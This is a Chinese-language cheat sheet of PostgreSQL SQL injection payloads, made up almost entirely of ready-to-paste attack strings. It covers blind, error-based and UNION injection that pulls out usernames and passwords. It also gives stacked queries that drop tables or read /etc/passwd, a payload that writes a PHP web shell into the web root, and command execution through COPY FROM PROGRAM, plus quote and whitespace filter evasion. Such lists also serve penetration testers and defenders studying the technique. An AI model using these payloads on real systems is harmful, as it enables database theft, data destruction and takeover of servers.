# PostgreSQL SQL 注入 Payload 模板

## 基础注入检测

### 布尔盲注

```sql
' AND 1=1--
' AND 1=2--
" AND 1=1--
" AND 1=2--
') AND 1=1--
') AND 1=2--
')) AND 1=1--
')) AND 1=2--
```

### 时间盲注

```sql
' AND pg_sleep(5)--
' SELECT pg_sleep(5)--
' AND (SELECT pg_sleep(5))--
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### 报错注入

```sql
' AND 1=CAST((SELECT version()) AS INT)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
' AND CAST(chr(126)||(SELECT version())||chr(126) AS NUMERIC)--
```

## 数据提取

### UNION 注入

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### 堆叠查询

```sql
'; DROP TABLE users--
'; CREATE TABLE pwned(t TEXT); COPY pwned FROM '/etc/passwd'--
'; COPY (SELECT * FROM users) TO '/tmp/users.txt'--
```

## PostgreSQL 特有功能

### 读取文件

```sql
' UNION SELECT pg_read_file('/etc/passwd')--
' UNION SELECT pg_read_binary_file('/etc/passwd')--
'; CREATE TABLE t(t TEXT); COPY t FROM '/etc/passwd'; SELECT * FROM t--
```

### 写入文件

```sql
'; COPY (SELECT '<?php system($_GET[c]); ?>') TO '/var/www/html/shell.php'--
'; SELECT pg_file_write('/var/www/html/shell.php', '<?php system($_GET[c]); ?>', false)--
```

### 执行命令 (需要 superuser)

```sql
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec--
'; COPY (SELECT * FROM pg_ls_dir('.')) TO PROGRAM 'cat > /tmp/listing.txt'--
```

### 大对象读取

```sql
' UNION SELECT (SELECT lo_export(loid, '/tmp/file') FROM pg_largeobject_metadata)--
'; SELECT lo_import('/etc/passwd', 12345); SELECT lo_export(12345, '/tmp/passwd_copy')--
```

## 绕过技术

### 引号绕过

```sql
# 使用 CHR 函数
' UNION SELECT CHR(116)||CHR(101)||CHR(115)||CHR(116)--

# 使用 $ 美元符号引号
' UNION SELECT $$test$$--
' UNION SELECT $tag$test$tag$--
```

### 函数替代

```sql
# substring -> substr
' AND SUBSTR(version(),1,1)='1'--

# concat -> ||
' UNION SELECT username||':'||password FROM users--
```

### 空白字符

```sql
# 使用其他空白字符
'%09AND%091=1--    # Tab
'%0AAND%0A1=1--    # 换行
'%0DAND%0D1=1--    # 回车
'%0CAND%0C1=1--    # 换页
```

## 信息收集

```sql
# 版本信息
' UNION SELECT version()--

# 当前用户
' UNION SELECT current_user--
' UNION SELECT user--
' UNION SELECT session_user--

# 数据库信息
' UNION SELECT current_database()--
' UNION SELECT datname FROM pg_database--

# 表结构
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--

# 权限检查
' UNION SELECT rolname,rolsuper,rolcreaterole FROM pg_roles--
```